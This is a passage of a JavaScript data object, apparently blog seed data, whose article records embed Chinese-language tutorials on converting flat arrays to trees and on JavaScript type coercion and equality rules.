          createdAt: '2021-03-17T14:32:38.000Z',
          updatedAt: '2021-03-17T14:32:38.000Z',
        },
      ],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 71,
      title: '数组结构转树型结构',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '# 数组转树\n\n```js\nvar tree1 = [{\n        "p_id": 0,\n        "id": 33,\n        "name": "港澳",\n    },\n    {\n        "p_id": 33,\n        "id": 3477,\n        "name": "香港特别行政区",\n    },\n    {\n        "p_id": 33,\n            "id": 3478,\n        "name": "澳门特别行政区",\n    },\n    {\n        "p_id": 3477,\n        "id": 3502,\n        "name": "九龙城区"\n    },\n    {\n        "p_id": 0,\n        "id": 6,\n        "name": "辽宁省",\n    },\n    {\n        "p_id": 6,\n        "id": 645,\n        "name": "抚顺市"\n    },\n]\n\n```\n\n## 递归1\n\n```js\n/**\n * 性能最差，全部递归。\n * 思想：把所有数据都当成子层，传入一个pid，获取所有id等于pid的数据，\n * 且当id等于pid时，先获取当前项的所有children，获取到当前项的所有children后，\n * 再将该项连同获取到的children存到res里，当遍历完了后，就可以获取所有指定pid的树型数据，最后返回res\n */\nfunction toTree(arr, pid) {\n    // 循环，获取该id的children\n    function loop(pid) {\n        // 保存得到的数据\n        var res = [];\n        // 遍历原数组\n        for (var i = 0; i < arr.length; i++) {\n            var item = arr[i]\n            if (item.p_id === pid) {\n                // 如果遍历到当前item的p_id等于目标pid，在将该item插入到res前，\n                // 先遍历该item的id，找到原数组arr里面该item的所有children后，再将该item连同找到的children一起插入到res\n                item.children = loop(item.id)\n                // 如果当前item的p_id等于目标pid，则将这个item插入res\n                res.push(item)\n            }\n        }\n        return res\n    }\n\n    return loop(pid)\n}\nconsole.log(toTree(tree, 0));\n```\n\n## 递归2\n\n```js\n/**\n * 第一次：传入tree以及父id:0，即找出tree里面所有父id是0的树型结构数据，\n * 进入for循环，第一次找到了港澳，港澳的id是33，\n * 再次重新遍历，找出tree里面所有p_id等于33的数据，\n * 遍历数据，首先找到香港的p_id是等于33，此时，不要直接将香港给港澳的children,\n * 而是先找香港的所有子，香港的id是3477，因此遍历所有数据，找到了九龙的p_id是3477，\n * 然后再找九龙的所有子，九龙的id是3502，遍历所有数据，找不到p_id是3502的数据，\n * 因此代表九龙下面没有子了，回到九龙的p_id，即香港，将九龙放到香港的children里，\n * 然后再次遍历继续找香港下面的子，但是找不到香港的子了，因此香港的数据找完了，将香港插入港澳的children，\n * 然后再次遍历，找到澳门的p_id等于33，此时，也是不要直接将澳门给港澳的children,\n * 而是先找到澳门的所有子，澳门的id是3478，因此遍历所有数据，找不到p_id是3478的数据，\n * 因此代表澳门下面没有子，将澳门插入港澳的children，\n * 最后继续遍历，找不到p_id是33的数据了，就把香港和澳门插入到港澳下面的children\n * 开始进入第二次遍历，找到澳门，其实澳门遍历过了，优化的时候要将遍历过的数据删掉\n * 优化后，第二次找到的应该是辽宁，辽宁的id是6，遍历当前数据（已经遍历过的已经删了）,\n * 找出里面所有p_id等于6的数据，找到抚顺市的p_id是6，此时，不要直接将抚顺给辽宁的children,\n * 而是先找抚顺的所有子，抚顺的id是645，因此遍历当前数据，找不到id是645的数据，即代表\n * 抚顺没有子，继续找出p_id等于6的数据，遍历后没有找到数据，代表辽宁省数据找完了，\n * 将抚顺插入到辽宁省，\n * 开始进入第三次遍历，但是这时候已经遍历完了（因为遍历过的都被删了）\n * 最后返回修改后的数组\n */\nfunction formatTree(arr) {\n    // 因为数组里面的是对象（引用），因此为了不改变原数组最好先深拷贝一下\n    var _arr = JSON.parse(JSON.stringify(arr))\n    var _parent = _arr.filter(item => item.p_id == 0);\n    var _children = _arr.filter(item => item.p_id != 0);\n    var all = arr.filter(item => true)\n\n    toTree(_parent, _children)\n\n    function toTree(parent, children) {\n        parent.map(p => {\n            children.map((c, index) => {\n                if (p.id == c.p_id) {\n                    // 如果当前父id等于子pid，则先递归找到子的所有子，然后再插入到父里面\n                    _children = JSON.parse(JSON.stringify(children))\n                    // 每次遍历一个就删掉一个，以免重复遍历\n                    _children.splice(index, 1)\n                    toTree([c], _children)\n                    if (p.children) {\n                        p.children.push(c)\n                    } else {\n                        p.children = [c]\n                    }\n                }\n            })\n        })\n    }\n\n    return _parent\n}\nconsole.log(formatTree(tree1));\n```\n\n## 非递归\n\n```js\nfunction formatTree1(arr) {\n    // 因为数组里面的是对象（引用），因此为了不改变原数组最好先深拷贝一下\n    var _arr = JSON.parse(JSON.stringify(arr))\n\n    // 遍历所有数据\n    var newarr = _arr.filter(p => {\n        // 获取当前父数据的所有children\n        var temp = _arr.filter(c => p.id == c.p_id)\n        // var temp = arr.filter(c => p.id == c.p_id)   //错误写法，这样的话并不会将\n        // 如果获取到了有children，则将该children给父\n        temp.length && (p.children = temp)\n        // 最后返回这个p\n        return p.p_id == 0\n    })\n    return newarr\n}\nconsole.log(formatTree1(tree1));\n/**\n * 思想：将每一项都当作父，找他的子\n * 遍历第一个时，遍历所有数据，将属于他的children找出来，然后给添加到自己上面\n * 然后第二个遍历继续，遍历所有数据，将属于他的children找出来，然后给添加到自己上面\n * 直到遍历到最后一个（即遍历完所有数据）\n * 举例：tree1里面map先遍历第一个，第一个是港澳，港澳的p_id是0，遍历全部数据，找不到id是0的数据，\n * 继续遍历第二个，第二个是香港，香港的p_id是33，遍历全部数据，只找到港澳的id是33,将香港插入到港澳，\n * 继续遍历第三个，第三个是澳门，澳门的p_id是33，遍历全部数据，只找到港澳的id是33,将澳门插入到港澳，\n * 继续遍历第四个，第四个是九龙，九龙的p_id是3477，遍历全部数据，只找到香港的id是3477,将九龙插入到香港，\n * 注意，关键：这里遍历修改的都是原数组，一开始将香港的引用给了港澳，后面又将九龙给了香港，因此，这时的港澳里\n * 面除了一开始的香港和澳门，还有多一个九龙在香港里面\n * 后面的就跟上面的类似，不再继续写了\n*/\n```\n\n',
      click: 50,
      createdAt: '2021-03-15T17:59:10.000Z',
      updatedAt: '2021-03-15T17:59:10.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 71,
            article_id: 71,
            type_id: 1,
            createdAt: '2021-03-15T17:59:10.000Z',
            updatedAt: '2021-03-15T17:59:10.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 71,
            user_id: 1,
            article_id: 71,
            createdAt: '2021-03-15T17:59:10.000Z',
            updatedAt: '2021-03-15T17:59:10.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
        {
          id: 22,
          name: '数据结构和算法',
          color: '#4eb1d0',
          createdAt: '2021-02-17T16:41:57.000Z',
          updatedAt: '2021-02-17T16:41:59.000Z',
        },
      ],
    },
    {
      id: 70,
      title: 'Js 类型转换',
      is_comment: 1,
      status: 1,
      img: '/1615431767725js类型转换.jpg',
      content:
        '\n\n# 动态类型\n\nJavaScript 是一种**弱类型**或者说**动态**语言。这意味着你不用提前声明变量的类型，在程序运行过程中，类型会被自动确定。这也意味着你可以使用同一个变量保存不同类型的数据：\n\n```js\nvar foo = 42;    // foo is a Number now\nfoo = "bar"; // foo is a String now\nfoo = true;  // foo is a Boolean now\n```\n\n# 类型转换规则\n\n## ToPrimitive内部运算\n\n> ToPrimitive(input, PreferredType?)\n\n`input`代表代入的值，而`PreferredType`可以是数字(Number)或字符串(String)其中一种，这会代表"优先的"、"首选的"的要进行转换到哪一种原始类型，转换的步骤会依这里的值而有所不同。但如果没有提供这个值也就是预设情况，则会设置转换的`hint`值为`"default"`。这个首选的转换原始类型的指示(`hint`值)，是在作内部转换时由JS视情况自动加上的，一般情况就是预设值（即`PreferredType`为Number）。\n\n而在JS的`Object`原型的设计中，都一定会有两个`valueOf`与`toString`方法，所以这两个方法在所有对象里面都会有，不过它们在转换有可能会交换被调用的顺序。\n\n### 当PreferredType为数字(Number)时\n\n当`PreferredType`为数字(Number)时，`input`为要被转换的值，以下是转换这个`input`值的步骤:\n\n1. 如果`input`是原始数据类型，则直接返回`input`。\n2. 否则，如果`input`是个对象时，则调用对象的`valueOf()`方法，如果能得到原始数据类型的值，则返回这个值。\n3. 否则，如果`input`是个对象时，调用对象的`toString()`方法，如果能得到原始数据类型的值，则返回这个值。\n4. 否则，抛出TypeError错误。\n\n### 当PreferredType为字符串(String)时\n\n上面的步骤2与3对调，如同下面所说:\n\n1. 如果`input`是原始数据类型，则直接返回`input`。\n2. 否则，如果`input`是个对象时，调用对象的`toString()`方法，如果能得到原始数据类型的值，则返回这个值。\n3. 否则，如果`input`是个对象时，则调用对象的`valueOf()`方法，如果能得到原始数据类型的值，则返回这个值。\n4. 否则，抛出TypeError错误。\n\n### PreferredType没提供时，也就是hint为"default"时\n\n与`PreferredType`为数字(Number)时的步骤相同。\n\n> **数字**其实是预设的首选类型，也就是说在一般情况下，加号运算中的对象要作转型时，都是先调用`valueOf`再调用`toString`。\n\n但这有两个异常，一个是`Date`对象，另一是`Symbol`对象，它们覆盖了原来的`PreferredType`行为，`Date`对象的预设首选类型是字符串(String)。\n\n> 因此你会看到在一些教程文件上会区分为两大类对象，一类是 Date 对象，另一类叫 非Date(non-date) 对象。因为这两大类的对象在进行转换为原始数据类型时，首选类型恰好相反。\n\n### valueOf与toString方法\n\n`valueOf`与`ToString`是在Object中的两个必有的方法，位于Object.prototype上，它是对象要转为原始数据类型的两个姐妹方法。从上面的内容已经可以看到，`ToPrimitive`这个抽象的内部运算，会依照设置的首选的类型，决定要先后调用`valueOf`与`toString`方法的顺序，当数字为首选类型时，优先使用`valueOf`，然后再调用`toString`。当字符串为首选类型时，则是相反的顺序。如果没有设置，则默认预设调用方式则是如数字首选类型一样，是先调用`valueOf`再调用`toString`。\n\nArray(数组)很常用到，虽然它是个对象类型，但它与Object的设计不同，它的`toString`有覆盖，说明一下数组的`valueOf`与`toString`的两个方法的返回值:\n\n- `valueOf`方法返回值: 对象本身。(与Object一样)\n- `toString`方法返回值: 相当于用数组值调用`join(\',\')`所返回的字符串。也就是`[1,2,3].toString()`会是`"1,2,3"`，这点要特别注意。\n\nFunction对象很少会用到，它的`toString`也有被覆盖，所以并不是Object中的那个`toString`，Function对象的`valueOf`与`toString`的两个方法的返回值:\n\n- `valueOf`方法返回值: 对象本身。(与Object一样)\n- `toString`方法返回值: **函数中包含的代码转为字符串值**\n\n## ToString抽象操作\n\n> 你不知道的JavaScript：\n>\n> a + "" （隐式）和前面的 String(a) （显式）之间有一个细微的差别需要注意。根据 ToPrimitive 抽象操作规则，a \\+ "" 会对 a 调用 valueOf() 方法，然后通过 ToString 抽象操作将返回值转换为字符串。而 String(a) 则是直接调用 ToString() 。\n\n> 对于普通 `对象` 来说，除非自行定义toString方法，否则就会调用**Object.prototype.toString()**方法，如果对象（如Array，Boolean，Function，Number等，它们都有自己的toString，不会调用Object.prototype.toString）有自己的toString方法，字符串化就会调用该方法并使用其返回值。\n\n```js\nvar a = {\n    valueOf: function () {\n        console.log(\'valueOf\');\n        return "1";\n    },\n    toString: function () {\n        console.log(\'toString\');\n        return "1";\n    }\n};\nvar b = [1];\nb.valueOf = function () {\n    console.log(\'valueOf\');\n    return "1";\n}\nb.toString = function () {\n    console.log(\'toString\');\n    return "1";\n}\nvar c = [1];\nc.valueOf = function () {\n    console.log(\'valueOf\');\n    return 111\n};\nc.toString = function () {\n    console.log(\'toString\');\n    return [1]\n};\n\nconsole.log(String(a));     //先执行toString，返回字符串1，是基本数据类型 ，返回该值，然后String("1")，即"1"\nconsole.log(String(b));     //先执行toString，返回字符串1，是基本数据类型 ，返回该值，然后String("1")，即"1"\n// 先执行toString，返回数组[1]，非基本数据类型 ，\n// 再执行valueOf，返回111，是基本数据类型，返回该值，然后String(111)，即"111"\nconsole.log(String(c)); //"111"\n```\n\n### JSON字符串化\n\n你不知道的JavaScript：\n\n> 工具函数 JSON.stringify(..) 在将 JSON 对象序列化为字符串时也用到了 ToString 。 \n>\n> 请注意，JSON 字符串化并非严格意义上的强制类型转换，因为其中也涉及 ToString 的相关规则，所以这里顺带介绍一 下。\n>\n> 对大多数简单值来说，JSON 字符串化和 toString() 的效果基本相同，只不过序列化的结果总是字符串：\n\n```js\nconsole.log(JSON.stringify(null)) // "null"\nconsole.log(JSON.stringify(undefined)) // undefined，注意这个undefined不是字符串的undefined\nconsole.log(JSON.stringify(true)) // "true"\nconsole.log(JSON.stringify(42)) // "42"\nconsole.log(JSON.stringify("42")) // ""42""\n```\n\n## ToNumber抽象操作\n\n你不知道的JavaScript：\n\n> 有时我们需要将非数字值当作数字来使用，比如数学运算。为此 ES5 规范在 9.3 节定义了抽象操作 ToNumber \n>\n> 其中 true 转换为 1 ，false 转换为 0 。undefined 转换为 NaN ，null 转换为 0 。 \n>\n> ToNumber 对字符串的处理基本遵循数字常量的相关规则 / 语法（参见第 3 章）。处理失败时返回 NaN （处理数字常量失败 时会产生语法错误）。不同之处是 ToNumber 对以 0 开头的十六进制数并不按十六进制处理（而是按十进制，参见第 2 章）。\n>\n> 对象（包括数组）会首先被转换为相应的基本类型值，如果返回的是非数字的基本类型值，则再遵循以上规则将其强制转换为 数字。 \n>\n> 为了将值转换为相应的基本类型值，抽象操作 ToPrimitive （参见 ES5 规范 9.1 节）会首先（通过内部操作 DefaultValue ，参见 ES5 规范 8.12.8 节）检查该值是否有 valueOf() 方法。如果有并且返回基本类型值，就使用该值进行强制类型转换。如果没有就使用 toString() 的返回值（如果存在）来进行强制类型转换。 \n>\n> 如果 valueOf() 和 toString() 均不返回基本类型值，会产生 TypeError 错误。\n\n```js\nvar a = { valueOf: function () { return "42"; } };\nvar b = { toString: function () { return "42"; } };\nvar c = [4, 2]; c.toString = function () {\n    return this.join(""); // "42" \n};\nNumber(a); // 42 \nNumber( b ); // 42 \nNumber( c ); // 42 \nNumber( "" ); // 0 \nNumber( [] ); // 0 \nNumber( [ "abc" ] ); // NaN\n```\n\n\n\n> Number(value)，value是被创建对象的数字值\n\n- value如果是基本类型，对于基本类型其中**true转换为1，false转换为0；undefined 转换为 NaN，null 转换为 0**。\n- value如果是引用类型，对于对象类型会首先转换成为基本类型值如果返回的是非数字的基本类型值，则再遵循基本类型转换规则将其强制转换为数字。为了将值转换为相应的基本类型值，会进行**ToPrimitive抽象操作**\n- Number()会将`PreferredType`设为Number\n- **会首先检查该值是否有 valueOf() 方法。如果有并且返回基本类型值，再使用该值进行强制类型转换。如果没有就使用 toString() 的返回值(如果存在)来进行强制类型转换。**如果 valueOf() 和 toString() 均不返回基本类型值，会产生 TypeError 错误。\n\n```js\nvar a = {\n    valueOf: function () {\n        console.log(\'valueOf\');\n        return "1";\n    },\n    toString: function () {\n        console.log(\'toString\');\n        return "1";\n    }\n};\nvar b = [1];\nb.valueOf = function () {\n    console.log(\'valueOf\');\n    return "1";\n}\nb.toString = function () {\n    console.log(\'toString\');\n    return "1";\n}\nvar c = [1];\nc.valueOf = function () {\n    console.log(\'valueOf\');\n    return [1]\n};\nc.toString = function () {\n    console.log(\'toString\');\n    return this.join("");\n};\n\nconsole.log(Number(a));     //先执行valueOf，返回字符串1，是基本数据类型 ，返回该值，然后Number("1")，即1\nconsole.log(Number(b));     //先执行valueOf，返回字符串1，是基本数据类型 ，返回该值，然后Number("1")，即1\n// 先执行valueOf，返回数组[1]，非基本数据类型 ，\n// 再执行toString，返回"1"，是基本数据类型，返回该值，然后Number("1")，即1\nconsole.log(Number(c)); //1\nconsole.log(Number(undefined));  //NaN\nconsole.log(Number(null));          //0\nconsole.log(Number(true));          //1\nconsole.log(Number(false));         //0\nconsole.log(Number());              //Number() === Number(null) ,即0\nconsole.log(Number(\'\'));            //0\nconsole.log(Number(\'-\'));           //NaN\nconsole.log(Number(\'12\'));          //12\nconsole.log(Number(\'12s\'));         //NaN\nconsole.log(Number([]));            //先valueOf本身[],再toString是"",即Number(""),即0\nconsole.log(Number({}));            //先valueOf本身{},再toString是"[object Object]",即Number("[object Object]"),即NaN\nconsole.log(Number([0]));           //先valueOf本身[0],再toString是"0",即Number("0"),即0\nconsole.log(Number(["1"]));\t        //先valueOf本身["1"],再toString是"1",即Number("1"),即1\nconsole.log(Number(["1", "2"]));\t//先valueOf本身["1","2"],再toString是"1,2",即Number("1,2"),即NaN\nconsole.log(Number([1]));\t        //先valueOf本身[1],再toString是"1",即Number("1"),即1\nconsole.log(Number([1, 2]));\t    //先valueOf本身[1,2],再toString是"1,2",即Number("1,2"),即NaN\nconsole.log(Number(["abc"]));\t    //先valueOf本身["abc"],再toString是"abc",即Number("abc"),即NaN\nconsole.log(+(\'-1\'));               //+("-1") === + Number("-1"),即+ -1，即-1\nconsole.log(-(\'-1\'));               //-("-1") === - Number("-1"),即- -1，即1\nconsole.log(+(\'0\'));                //+("0") === + Number("0"),即+ 0，即0\nconsole.log(-(\'0\'));                //-("0") === - Number("0"),即- 0，即-0\n```\n\n## ToBoolean抽象操作\n\n### 假值\n\n> 以下这些是假值：undefined、null、false、 +0 、-0 和 NaN "" \n>\n> 假值的布尔强制类型转换结果为 false 。\n\n### 假值对象\n\n```js\nvar val1 = new Boolean(false)\nvar val2 = new Number(0)\nvar val3 = false\nconsole.log(Boolean(false));        //fasle\nconsole.log(val1);                  //Boolean {false}\nconsole.log(val2)\t\t\t\t\t//NUmber { 0 }\nconsole.log(Boolean(val1 && val2))\t//true\nif (val1) { \n    console.log( "打印1" );\t//执行这里\n}\nif (val3) { \n    console.log( "打印2" );\n}else{\n    console.log("打印3")\t//执行这里\n}\n```\n\nval1和val2就是一个假值对象，我们为 val1和val2 创建了一个封装对象，然而该对象是真值（“truthy”，即总是返回 true ），所以这里使用封装对象得到的结果和使用 false 截然相反。\n\n```js\nvar a = []\na.valueOf = function () {\n    console.log(\'valueOf\');\n}\na.toString = function () {\n    console.log(\'toString\');\n}\nconsole.log(Boolean(a));    //valueOf和toString都不执行，直接打印true\nvar val1 = new Boolean(false)\nvar val2 = new String(\'1\')\nconsole.log(Boolean(false));        //fasle\nconsole.log(val1);                  //Boolean {false}\nconsole.log(new Boolean(false));    //Boolean {false}\nconsole.log(new Boolean(1));        //Boolean {false}\nconsole.log(Boolean(val1));         //true\nconsole.log(Boolean(val2));         //true\n```\n\n```js\nconsole.log(Boolean(undefined));    //false\nconsole.log(Boolean(null));         //false\nconsole.log(Boolean(0));            //false\nconsole.log(Boolean(+0));           //false\nconsole.log(Boolean(-0));           //false\nconsole.log(Boolean(NaN));          //false\nconsole.log(Boolean(\'\'));           //false\nconsole.log(Boolean());           \t//false\nconsole.log(Boolean(\'\'));           //false\nconsole.log(Boolean());           \t//false\n\n// 除了上述类型转换为假值，其余都可以理解为真值，所有对象都真值\nconsole.log(Boolean(-10));                  //true\nconsole.log(Boolean(+10));                  //true\nconsole.log(Boolean(new String(\'\')));       //true\nconsole.log(Boolean(new String(0)));        //true\nconsole.log(Boolean(new String(\'-10\')));    //true\nconsole.log(Boolean(new Number(0)));        //true\nconsole.log(Boolean(new Number(-0)));       //true\nconsole.log(Boolean(new Number(+0)));       //true\nconsole.log(Boolean(new Number(+0)));       //true\nconsole.log(Boolean(new Array([])));        //true\nconsole.log(Boolean(new Object()));         //true\nconsole.log(Boolean(function () { }));      //true\n```\n\n# 显示强制类型转换\n\n## 字符串与数字之间的显示转换\n\n```js\nvar a = 42;\nvar b = a.toString();\nconsole.log(b); //"42"\nconsole.log(typeof b);  //string\n/**\n * a是一个基本类型，是没有toString这个方法的，但是js会给它自动包装一层，然后调用完后立即销毁\n * 伪代码：\n * let a = 42;\n * let b = new String(a).toString()\n * console.log(b) //"42"\n*/\n```\n\na.toString() 是显式的，不过其中涉及隐式转换。因为 toString() 对 42 这样的基本类型值不适用，所以 JavaScript 引擎会自动为 42 创建一个封装对象(包装类)，然后对该对象调用 toString()。这里显式转换中含有隐式转换。\n\n## 显示转换为布尔值\n\n```js\nvar a = "0";\nvar b = [];\nvar c = {};\nvar d = "";\nvar e = 0;\nvar f = null;\nvar g;\nconsole.log(Boolean(a)); // true\nconsole.log(Boolean(b)); // true\nconsole.log(Boolean(c)); // true\nconsole.log(Boolean(d)); // false\nconsole.log(Boolean(e)); // false\nconsole.log(Boolean(f)); // false\nconsole.log(Boolean(g)); // false\n```\n\n\n\n# 隐式强制类型转换\n\n根据[规范中的加法操作](http://www.ecma-international.org/ecma-262/7.0/#sec-addition-operator-plus-runtime-semantics-evaluation)，对于操作`x + y`，会调用`ToPrimitive(x)`和`ToPrimitive(y)`把`x`和`y`转化为原始数据类型。\n\n## 从字符串隐式强制类型转换为数字的情况\n\n```js\nvar a = []\nvar b = \'0\'\n\nconsole.log(a - b);     //0\n/**\n * -是数字减法运算a和b都不是number，都要强制转换为数字\n * a首先进行ToPrimitive操作，a的valueOf()的值是[]，不是基本类型，继续toString()\n * a的toString()的值是"",是基本类型，然后Number("")，即0\n * b是基本类型，直接Number(\'0\')，即0\n * 转化后结果就是0-0，即0\n*/\n\nvar c = [1, 2, 3]\nconsole.log(c - b); //NaN\nconsole.log(b - c); //NaN\n/**\n * c.valueOf()是[1,2,3]，继续toString()，结果是"1，2，3"，是基本数据类型，Number("1,2,3")结果是NaN\n * b转化后是0\n * NaN-0还是NaN\n*/\n\nvar d = { age: 12 }\nconsole.log(d - c);   //NaN\nconsole.log(c - d);   //NaN\n\nvar e = [12]\nconsole.log(e - b); //12\n```\n\n## 从对象强制隐式转换\n\n```js\nvar a = [10]\nvar b = 1\nvar c = a - b   // "10" - 1\nconsole.log(a.valueOf());   //[10]\nconsole.log(a.toString());  //"10"\nconsole.log(typeof a.toString());   //string\nconsole.log(c);         //9\nconsole.log(typeof c);  //number\n```\n\n```js\nvar a = [10]\nvar b = "1"\nvar c = a - b   // "10" - "1"\nconsole.log(a.valueOf());   //[10]\nconsole.log(a.toString());  //"10"\nconsole.log(typeof a.toString());   //string\nconsole.log(c);         //9\nconsole.log(typeof c);  //number\n```\n\n```js\nvar a = {\n    valueOf: function () {\n        return 10\n    }\n}\nvar b = {\n    valueOf: function () {\n        return "1"\n    }\n}\nvar c = a - b   // 10 - "1"\nconsole.log(a.valueOf());   //10\nconsole.log(a.toString());  //"[object Object]"\nconsole.log(typeof a.toString());   //string\nconsole.log(c);         //9\nconsole.log(typeof c);  //number\n```\n\n\n\n```js\nvar a = [10, 20]\nvar b = 1\nvar c = a - b   // "10,20" - 1\nconsole.log(a.valueOf());   //[10,20]\nconsole.log(a.toString());  //"10,20"\nconsole.log(typeof a.toString());   //"string"\nconsole.log(c);         //NaN\nconsole.log(typeof c);  //number\n```\n\n## 隐式类型转换Boolean\n\n为任意的数据类型做两次非运算，即可将其转换为布尔值\n\n```js\nvar a = "123"\nconsole.log(!!a)\t//true\nvar b = 0\nconsole.log(!!0)\t//false\n```\n\n# 宽松相等和严格相等\n\n《你不知道的JavaScript》\n\n> 宽松相等（loose equals）== 和严格相等（strict equals）=== 都用来判断两个值是否“相等”，但是它们之间有一个很重要的区别，特别是在判断条件上。 \n>\n> 常见的误区是“== 检查值是否相等，=== 检查值和类型是否相等”。听起来蛮有道理，然而还不够准确。很多 JavaScript 的书籍和博客也是这样来解释的，但是很遗憾他们都错了。 \n>\n> 正确的解释是：“== 允许在相等比较中进行强制类型转换，而 === 不允许。”\n\n## 性能对比\n\n因为==允许在比较重进行强制类型转换，而===不允许，因此==进行强制类型转换时确实需要多花点时间，性能来说是===的性能更优，但是这些性能其实可以忽略不计。\n\n## 抽象相等\n\n定如果两个值的类型相同，就仅比较它们是否相等。例如，42 等于 42 ，"abc" 等于 "abc" 。 \n\n有几个非常规的情况需要注意。 \n\nNaN 不等于 NaN （参见第 2 章）。 \n\n+0 等于 -0 （参见第 2 章）\n\n两个对象指向同一个值时即视为相等，不发生强制类型转换。\n\n## 宽松不相等\n\n宽松不相等（loose not-equality）!= 就是 == 的相反值，!== 同理。\n\n## 抽象关系比较\n\n### 字符串和数字之间的相等比较\n\n```js\nvar a = 42;\nvar b = "42";\na === b; // false \na == b; // true\n```\n\n> 你不知道的JavaScript：\n\n因为没有强制类型转换，所以 a === b 为 false ，42 和 "42" 不相等。 \n\n而 a == b 是宽松相等，即如果两个值的类型不同，则对其中之一或两者都进行强制类型转换。 \n\n具体怎么转换？是 a 从 42 转换为字符串，还是 b 从 "42" 转换为数字？\n\n> ES5 规范 11.9.3.4-5 这样定义： \n>\n> (1) 如果 Type(x) 是数字，Type(y) 是字符串，则返回 x == ToNumber(y) 的结果。\n>\n>  (2) 如果 Type(x) 是字符串，Type(y) 是数字，则返回 ToNumber(x) == y 的结果。\n\n即数字和字符串比较，或字符串和数字比较，都会将字符串转成数字\n\n比较双方首先调用 ToPrimitive ，如果结果出现非字符串，就根据 ToNumber 规则将双方强制类型转换为数字来进行比 较。\n\n```js\nvar a = [42];\nvar b = ["43"];\na.valueOf = function () {\n    console.log(\'a的valueOf\');\n    return Array.prototype.valueOf.call(this)\n}\na.toString = function () {\n    console.log(\'a的toString\');\n    console.log(Array.prototype.toString.call(this));\n    return Array.prototype.toString.call(this)\n}\nb.valueOf = function () {\n    console.log(\'b的valueOf\');\n    return Array.prototype.valueOf.call(this)\n}\nb.toString = function () {\n    console.log(\'b的toString\');\n    console.log(Array.prototype.toString.call(this));\n    return Array.prototype.toString.call(this)\n}\nconsole.log(a < b)// false\n/**\n * 对象和对象比较，都转为基本类型再对比\n * 首先a进行toPrimitive操作，先执行valueOf,打印a的valueOf，返回[42]，不是基本类型，\n * 继续toString，打印a的toString，打印"42",返回"42"\n * 首先b进行toPrimitive操作，先执行valueOf,打印b的valueOf，返回["42"]，不是基本类型，\n * 继续toString，打印b的toString，打印"43",返回"43"\n * 结果："42"<"43"，再通过toNumber对比:\n*/\n```\n\n### 其他类型和布尔类型之间的相等比较\n\n> 规范 11.9.3.6-7 是这样说的： \n>\n> (1) 如果 Type(x) 是布尔类型，则返回 ToNumber(x) == y 的结果； \n>\n> (2) 如果 Type(y) 是布尔类型，则返回 x == ToNumber(y) 的结果。 \n\n即：布尔类型和其他类型比较时，都会将布尔类型转成数字。\n\n```js\nvar x = true;\nvar y = "42";\nx == y; // false\n```\n\nType(x) 是布尔值，所以 ToNumber(x) 将 true 强制类型转换为 1 ，变成 1 == "42" ，二者的类型仍然不同，"42" 根据规则(字符串和数字对比)被强制类型转换为 42 ，最后变成 1 == 42 ，结果为 false 。反过来也一样\n\n```js\nvar x = "42"; \nvar y = false;\nx == y; // false\n```\n\nType(y) 是布尔值，所以 ToNumber(y) 将 false 强制类型转换为 0 ，然后 "42" == 0 再变成 42 == 0 ，结果为 false 。 也就是说，字符串 "42" 既不等于 true (第一个例子x == y; // false看出)，也不等于 false（第二个例子x == y; // false看出） 。一个值怎么可以既非真值也非假值，这也太奇怪了吧？ 这个问题本身就是错误的，我们被自己的大脑欺骗了。 \n\n"42" 是一个真值没错，但 "42" == true 中并没有发生布尔值的比较和强制类型转换。这里不是 "42" 转换为布尔值 \n\n（true ），而是 true 转换为 1 ，"42" 转换为 42 。 \n\n这里并不涉及 ToBoolean ，所以 "42" 是真值还是假值与 == 本身没有关系！ \n\n重点是我们要搞清楚 == 对不同的类型组合怎样处理。== 两边的布尔值会被强制类型转换为数字。 \n\n### 对象和非对象之间的相等比较\n\n> 关于对象（对象 / 函数 / 数组）和标量基本类型（字符串 / 数字 / 布尔值）之间的相等比较，ES5 规范 11.9.3.8-9 做如下规定： \n>\n> (1) 如果 Type(x) 是字符串或数字，Type(y) 是对象，则返回 x == ToPrimitive(y) 的结果； \n>\n> (2) 如果 Type(x) 是对象，Type(y) 是字符串或数字，则返回 ToPromitive(x) == y 的结果。\n>\n> 即：如果遇到遇到对象，就将对象转化为基本类型。\n\n这里只提到了字符串和数字，没有布尔值。原因是我们之前介绍过 11.9.3.6-7 中规定了布尔值会先被强制类型转换为数字。\n\n### null 和 undefined 之间的相等比较\n\nnull 和 undefined 之间的 == 也涉及隐式强制类型转换。ES5 规范 11.9.3.2-3 规定： \n\n(1) 如果 x 为 null ，y 为 undefined ，则结果为 true 。 \n\n(2) 如果 x 为 undefined ，y 为 null ，则结果为 true 。 \n\n在 == 中 null 和 undefined 相等（它们也与其自身相等），除此之外其他值都不存在这种情况。 \n\n这也就是说在 == 中 null 和 undefined 是一回事，可以相互进行隐式强制类型转换：\n\n```js\nvar a = null; \nvar b; \na == b; // true a == null; // true \nb == null; // true \na == false; // false \nb == false; // false \na == ""; // false \nb == ""; // false \na == 0; // false \nb == 0; // false\n```\n\n### [] == ![]\n\n```js\n[] == ![];//true\n```\n\n首先看![]，[]是真值，因此![]是false，因此上述代码转化为：[] == false，此时变成了其他类型和布尔类型的比较，将布尔类型转化为数字，\n\n即转化为了：[] == 0，此时又变成了对象和非对象之间的比较，将[]转化为基本类型，得到""，然后即：“”  == 0，有符合字符串和数字之间的比较，\n\n将字符串转化为数字，““转化为数字0，即最终转化：0 == 0，所以结果为true\n\n# 案例\n\n### 案例1\n\n```js\nconsole.log({} + 1);    //"[object Object]" + 1，即"[object Object]1"\nconsole.log({} - 1);    //"[object Object]" - 1，即NaN\nconsole.log({} - \'1\');    //"[object Object]" - 